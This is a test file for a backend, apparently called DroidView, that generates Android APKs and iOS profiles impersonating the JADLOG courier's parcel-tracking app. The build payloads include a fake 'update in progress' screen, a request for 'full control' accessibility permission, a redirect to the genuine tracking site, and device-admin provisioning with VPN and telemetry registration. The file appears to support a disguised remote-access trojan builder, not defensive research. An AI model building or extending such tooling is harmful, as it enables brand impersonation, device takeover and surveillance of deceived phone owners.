import { describe, expect, it } from "vitest";
import { buildApp } from "../src/app.js";
import { decodeEnrollment } from "../src/apkArtifacts.js";

describe("E2E APK Creation, Customization & Telemetry Flow", () => {
  it("executes complete lifecycle: login -> custom build -> artifact download -> device enrollment & telemetry", async () => {
    const app = buildApp();
    await app.ready();

    // 1. Authenticate Operator/Admin
    const loginRes = await app.inject({
      method: "POST",
      url: "/auth/login",
      payload: { email: "admin@dview.local", password: "admin123", totp: "123456" }
    });
    expect(loginRes.statusCode).toBe(200);
    const { token } = loginRes.json();
    expect(token).toBeDefined();
    const headers = { authorization: `Bearer ${token}` };

    // 2. Submit APK Build Request with full brand customization & 10 screens parameters
    const buildPayload = {
      appName: "JADLOG Rastreio",
      serverUrl: "http://localhost:3000",
      redirectUrl: "https://jadlog.com.br/rastreamento",
      enrollmentToken: `enroll-${Date.now()}`,
      deviceName: "Samsung Galaxy Note 10+ (SM-N975F)",
      vpnEnabled: true,
      vpnPort: 8443,
      vpnProtocol: "TLS" as const,
      islandProfileEnabled: true,
      workProfileEnabled: true,
      screenConfig: {
        loadingSubtext: "aguarde, atualização em andamento...",
        speechCalloutText: "Este aplicativo requer permissão de acesso para funcionar. Por favor, permita para continuar.",
        copyrightText: "JADLOG Rastreio. All Rights Reserved.",
        permissionDialogTitle: "Permitir controle total para JADLOG Rastreio?",
        serviceDescription: "O serviço de acessibilidade do JADLOG Rastreio permite assistência técnica, leitura de status logístico e suporte operacional.",
        accentColor: "#dc2626",
        trackingTitle: "Rastreamento de Encomendas",
        trackingSubtext: "Serviços validados com sucesso. Digite o código ou acompanhe suas remessas."
      }
    };

    const buildRes = await app.inject({
      method: "POST",
      url: "/apk/build",
      headers,
      payload: buildPayload
    });

    expect(buildRes.statusCode).toBe(200);
    const buildResult = buildRes.json();
    expect(buildResult.apkName).toBe("JADLOG-Rastreio.apk");
    expect(buildResult.downloadUrl).toMatch(/^\/apk\/download\//);
    expect(buildResult.sha256).toBeDefined();
    expect(buildResult.sha256.length).toBe(64);
    expect(buildResult.qrPayload).toBeDefined();
    expect(buildResult.zeroTouchQrPayload).toBeDefined();

    const parsedMdm = JSON.parse(buildResult.zeroTouchQrPayload);
    expect(parsedMdm["android.app.extra.PROVISIONING_DEVICE_ADMIN_COMPONENT_NAME"]).toBe(
      "com.droidview.agent/com.droidview.agent.mdm.DroidViewDeviceAdminReceiver"
    );
    expect(parsedMdm["android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_CHECKSUM"]).toBeDefined();
    expect(parsedMdm["android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_LOCATION"]).toContain("/apk/download/");
    const adminExtras = parsedMdm["android.app.extra.PROVISIONING_ADMIN_EXTRAS_BUNDLE"];
    expect(adminExtras).toBeDefined();
    expect(adminExtras.encrypted).toBe(true);
    expect(adminExtras.algorithm).toBe("AES-256-GCM");
    expect(adminExtras.cipherText).toBeDefined();
    expect(adminExtras.iv).toBeDefined();
    expect(adminExtras.tag).toBeDefined();
    expect(adminExtras.signature).toBeDefined();
    expect(adminExtras.securityHash).toBeDefined();

    // Verify Plural Route Alias (/apks/build)
    const pluralRes = await app.inject({
      method: "POST",
      url: "/apks/build",
      headers,
      payload: buildPayload
    });
    expect(pluralRes.statusCode).toBe(200);
    expect(pluralRes.json().zeroTouchQrPayload).toBeDefined();

    // 3. Verify Decoded Enrollment Config matches submitted customization
    const configToken = buildResult.downloadUrl.replace("/apk/download/", "");
    const decoded = decodeEnrollment(configToken);
    expect(decoded.appName).toBe("JADLOG Rastreio");
    expect(decoded.serverUrl).toBe("http://localhost:3000");
    expect(decoded.vpnEnabled).toBe(true);
    expect(decoded.islandProfileEnabled).toBe(true);
    expect(decoded.workProfileEnabled).toBe(true);
    expect(decoded.screenConfig?.accentColor).toBe("#dc2626");
    expect(decoded.screenConfig?.loadingSubtext).toBe("aguarde, atualização em andamento...");
    expect(decoded.screenConfig?.speechCalloutText).toContain("requer permissão de acesso");

    // 4. Verify Download of the Artifact
    const downloadRes = await app.inject({
      method: "GET",
      url: buildResult.downloadUrl
    });
    expect(downloadRes.statusCode).toBe(200);
    expect(downloadRes.headers["content-type"]).toBe("application/vnd.android.package-archive");
    expect(downloadRes.headers["content-disposition"]).toContain("JADLOG-Rastreio.apk");
    expect(downloadRes.rawPayload.length).toBeGreaterThan(1000);

    // 5. Verify Build History List in Backend
    const listRes = await app.inject({
      method: "GET",
      url: "/apk/builds",
      headers
    });
    expect(listRes.statusCode).toBe(200);
    const buildsList = listRes.json();
    expect(Array.isArray(buildsList)).toBe(true);
    const createdBuild = buildsList.find((b: any) => b.appName === "JADLOG Rastreio");
    expect(createdBuild).toBeDefined();
    expect(createdBuild.status).toBe("completed");
    expect(createdBuild.islandProfileEnabled).toBe(true);
    expect(createdBuild.screenConfig.accentColor).toBe("#dc2626");

    // 6. Simulate Agent Installation, Activation & Telemetry Registration
    const agentRegisterRes = await app.inject({
      method: "POST",
      url: "/devices/register",
      headers,
      payload: {
        id: "jadlog_n975f_real",
        name: "Samsung Note 10+ Jadlog",
        model: "SM-N975F",
        androidVersion: "7.1.2",
        status: "online",
        battery: 92,
        networkType: "wifi",
        networkName: "Jadlog-Corporate-WiFi",
        signalStrength: 98,
        networkSpeed: "144 Mbps",
        pingMs: 8,
        ipAddress: "172.18.48.50",
        isEmulator: true
      }
    });
    expect(agentRegisterRes.statusCode).toBe(200);

    // 7. Verify Device Telemetry in Dashboard/Devices Query
    const devicesRes = await app.inject({
      method: "GET",
      url: "/devices",
      headers
    });
    expect(devicesRes.statusCode).toBe(200);
    const devices = devicesRes.json();
    const enrolledDevice = devices.find((d: any) => d.id === "jadlog_n975f_real");
    expect(enrolledDevice).toBeDefined();
    expect(enrolledDevice.status).toBe("online");
    expect(enrolledDevice.networkType).toBe("wifi");
    expect(enrolledDevice.networkSpeed).toBe("144 Mbps");
    expect(enrolledDevice.signalStrength).toBe(98);
    expect(enrolledDevice.ipAddress).toBe("172.18.48.50");

    await app.close();
  }, 120000);

  it("generates Apple iOS enterprise profile (.mobileconfig) and native Swift project", async () => {
    const app = buildApp();
    await app.ready();

    const loginRes = await app.inject({
      method: "POST",
      url: "/auth/login",
      payload: { email: "admin@dview.local", password: "admin123", totp: "123456" }
    });
    const { token } = loginRes.json();
    const headers = { authorization: `Bearer ${token}` };

    const iosPayload = {
      platform: "ios" as const,
      appName: "JADLOG Rastreio iOS",
      bundleId: "br.com.jadlog.rastreio.ios",
      serverUrl: "http://localhost:3000",
      redirectUrl: "https://jadlog.com.br/rastreamento",
      enrollmentToken: `enroll-ios-${Date.now()}`,
      vpnEnabled: true,
      screenConfig: {
        accentColor: "#dc2626",
        loadingSubtext: "sincronizando perfil iOS..."
      }
    };

    const buildRes = await app.inject({
      method: "POST",
      url: "/apk/build",
      headers,
      payload: iosPayload
    });

    expect(buildRes.statusCode).toBe(200);
    const result = buildRes.json();
    expect(result.platform).toBe("ios");
    expect(result.apkName).toBe("JADLOG-Rastreio-iOS.mobileconfig");
    expect(result.artifactType).toBe("ios-profile");
    expect(result.downloadUrl).toMatch(/^\/ios\/download\//);
    expect(result.iosProfileUrl).toMatch(/^\/ios\/profile\//);
    expect(result.sha256).toBeDefined();

    // Verify Direct .mobileconfig Download (Over-The-Air Safari payload)
    const profileRes = await app.inject({
      method: "GET",
      url: result.iosProfileUrl
    });
    expect(profileRes.statusCode).toBe(200);
    expect(profileRes.headers["content-type"]).toBe("application/x-apple-aspen-config");
    expect(profileRes.headers["content-disposition"]).toContain("JADLOG-Rastreio-iOS.mobileconfig");
    const profileXml = profileRes.body;
    expect(profileXml).toContain("<key>PayloadType</key>");
    expect(profileXml).toContain("com.apple.webClip.managed");
    expect(profileXml).toContain("com.apple.vpn.managed");
    expect(profileXml).toContain("JADLOG Rastreio iOS");

    // Verify Native Swift Project ZIP Download
    const zipRes = await app.inject({
      method: "GET",
      url: result.downloadUrl
    });
    expect(zipRes.statusCode).toBe(200);
    expect(zipRes.headers["content-type"]).toBe("application/zip");
    expect(zipRes.headers["content-disposition"]).toContain("-ios-project.zip");
    expect(zipRes.rawPayload.length).toBeGreaterThan(100);

    await app.close();
  }, 120000);
});
